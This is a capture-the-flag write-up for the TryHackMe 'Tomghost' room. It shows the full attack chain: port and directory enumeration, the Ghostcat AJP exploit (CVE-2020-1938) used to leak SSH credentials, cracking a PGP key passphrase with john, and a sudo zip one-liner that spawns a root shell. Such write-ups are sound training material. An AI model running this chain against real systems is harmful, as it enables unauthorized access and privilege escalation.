---
title: TryHackMe - Tomghost
date: 2022-11-25 14:35:00 +0530
categories: [TryHackMe]
tags: [tryhackme, Easy]
---

-------
Room: https://tryhackme.com/room/tomghost

Difficulty : Easy

As always, starting off the test with adding the machine IP to /etc/hosts.

## Enumeration

Starting Nmap scan.

```console
$ sudo nmap -Pn tom.thm 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 21:59 EST
Nmap scan report for tom.thm (10.10.115.122)
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.89 seconds

$ sudo nmap -Pn -p22,53,8009,8080 -sC -sV tom.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 22:00 EST
Nmap scan report for tom.thm (10.10.115.122)
Host is up (0.15s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
```

From above scan, there are some points to note.
1. Port `22` is open, to connect to the machine using **SSH**.
2. Port `8080` is run by apache tomcat **v9.0.30**.
3. Port `8009` is run by apache Jserve protocol **(APJ)**.

I ran **gobuster** to check if any juicy directories are present. But there are none.

```console
$ gobuster dir -u http://tom.thm:8080 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tom.thm:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/25 22:05:23 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

```console
$ gobuster dir -u http://tom.thm:8080 -w ~/Github/SecLists/Discovery/Web-Content/ApacheTomcat.fuzz.txt
//examples            (Status: 302) [Size: 0] [--> /examples/]
//examples/jsp/index.html (Status: 200) [Size: 14245]
//examples/servlets/index.html (Status: 200) [Size: 6596]
//manager             (Status: 302) [Size: 0] [--> /manager/]
//manager/deploy?path=foo (Status: 403) [Size: 3446]
//manager/text        (Status: 403) [Size: 3446]
//manager/jmxproxy    (Status: 403) [Size: 3446]
//manager/html        (Status: 403) [Size: 3446]
//manager/html/       (Status: 403) [Size: 3446]
//manager/status      (Status: 403) [Size: 3446]
//RELEASE-NOTES.txt   (Status: 200) [Size: 6898]
//examples/jsp/snp/snoop.jsp (Status: 200) [Size: 574]
```

## Initial exploitation

Since i could not find anything, I searched for Apache Tomcat exploits for the given version in `searchsploit`.

```console
$ searchsploit tomcat
```

Although there were some results, none of them matched to the given version of **apache tomcat**. But the results showed an exploit for **Apache Jserve Protocol (AJP)**. This is about **Ghostcat** vulnerability with ` CVE-2020-1938`. So I copied it to my local directory.

```console
searchsploit -m 48143
```

There were some python errors while running this exploit. I had to make some changes for it to work.
1. Instead of `bufsize`, use `buffering=0`.
2. The last print statement needs `b""`.

Now run the exploit.
```console
$ python 48143.py tom.thm

SNIPPED
b'<?xml version="1.0" encoding="UTF-8"?>\n
<display-name>Welcome to Tomcat</display-name>\n  <description>\n     Welcome to GhostCat\n\t
skyfuck:8730281lkjlkjdqlksalks\n  
</description>\n\n</web-app>\n\x00'
```

> skyfuck:8730281lkjlkjdqlksalks

We got some creds from exploiting. I thought these were some hashes, but no. It is `skyfuck's` password to SSH.

`ssh skyfuck@tom.thm`

There was no **user.txt** in __skyfuck's__ home directory.  So i ran **linpeas.sh**.


Now, We know 3 users are there. and _user.txt_ is present **merlin's** home directory.
```console
$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

From linpeas output, we have two files of interest in skyfuck's home directory.
1.  tryhackme.asc
2. credential.pgp

**tryhackme.asc** seems to be some sort of PGP private key. Lets convert it into gpg hash.

```console
$ gpg2john tryhackme.asc > hash && cat hash

File tryhackme.asc
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

As we have the hash now, lets use **john** tool to check if this hash matches with any other hash in **rockyou.txt** wordlist.

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
alexandru
```

we got the match to hash of `alexandru`. Let's pass this word as passphrase to decrypting the **credential.pgp** file on he tom.thm machine.

``` console
$ gpg --import tryhackme.asc
$ gpg --list-secret-keys
$ gpg --output ./d.txt --decrypt ./credential.pgp
$ cat d.txt
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jskyfuck@ubuntu
```

> merlin : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

Exit the current SSH session to **tom.thm** machine and login as `merlin` with found password.

`ssh merlin@tom.thm`

## Privilege Escalation

Let's see, what can `merlin` run as `root`.
```console
$ sudo -l
SNIPPED
(root : root) NOPASSWD: /usr/bin/zip
```

`merlin` can run **zip** as `root`. Lets check if we have some privilege escalation here, in [GTFO bins](https://gtfobins.github.io/gtfobins/zip/#sudo).  we do. 

```console
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Running the above code, will escalate our current shell to root privileges. We can find the flag in `/root/root.txt` directory.